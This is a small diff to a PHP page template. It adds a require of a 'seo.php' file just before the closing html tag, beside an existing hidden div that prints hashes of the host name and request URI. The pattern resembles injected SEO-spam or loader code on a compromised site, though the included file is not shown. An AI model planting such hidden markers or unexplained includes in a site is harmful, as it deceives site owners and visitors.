@@ -31,4 +31,5 @@
 );?>
 <div class="asessorname" data="Kgxk" style="display:none;">Dku<?php echo md5($_SERVER['HTTP_HOST'])?> -  Dku<?php echo md5($_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'])?></div>
 </body>
+<?require($_SERVER["DOCUMENT_ROOT"]."/seo.php");?>
 </html>
